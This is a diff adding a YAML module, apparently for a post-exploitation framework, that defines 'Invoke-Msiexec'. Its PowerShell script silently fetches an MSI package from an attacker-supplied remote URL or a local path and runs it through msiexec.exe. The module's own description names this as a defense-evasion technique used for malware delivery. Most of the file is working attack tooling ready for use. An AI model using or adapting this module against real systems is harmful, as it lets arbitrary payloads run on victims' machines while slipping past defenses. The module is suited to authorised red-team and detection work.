@@ -1,0 +1,77 @@
+name: Invoke-Msiexec
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Execute a remote or local MSI package via msiexec.exe for signed
+  binary proxy execution. Msiexec.exe is the Windows Installer
+  command-line utility. Adversaries abuse it to execute arbitrary MSI
+  payloads, including remotely hosted ones, which can contain embedded
+  scripts (JScript, VBScript), DLLs, or executables. This technique
+  is commonly seen in malware delivery where the MSI is fetched from
+  a remote URL and executed silently.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.007]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: MsiUrl
+    description: >-
+      URL or local path to the MSI payload. Supports both remote (http/https) and
+      local file paths.
+    required: true
+    value: ''
+  - name: Quiet
+    description: Run msiexec in quiet mode (no UI).
+    required: false
+    value: 'True'
+    strict: true
+    suggested_values:
+      - True
+      - False
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Msiexec {
+      param(
+          [string]$MsiUrl,
+          [switch]$Quiet
+      )
+
+      $msiExe = "C:\Windows\System32\msiexec.exe"
+
+      Write-Output "[*] Executing MSI payload via msiexec.exe..."
+      Write-Output "[*] Target: $MsiUrl"
+
+      $msiArgs = @()
+      if ($Quiet) { $msiArgs += "/q" }
+      $msiArgs += "/i"
+      $msiArgs += "`"$MsiUrl`""
+
+      $argString = $msiArgs -join " "
+      Write-Output "[*] Command: $msiExe $argString"
+      try {
+          $proc = Start-Process -FilePath $msiExe -ArgumentList $argString -Wait -PassThru -NoNewWindow -ErrorAction Stop
+          if ($proc.ExitCode -ne 0) {
+              Write-Output "[-] Msiexec failed with exit code: $($proc.ExitCode)"
+          } else {
+              Write-Output "[+] Msiexec execution completed successfully."
+          }
+      } catch {
+          Write-Output "[-] Failed to launch msiexec.exe: $($_.Exception.Message)"
+      }
+  }
+script_end: Invoke-Msiexec {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
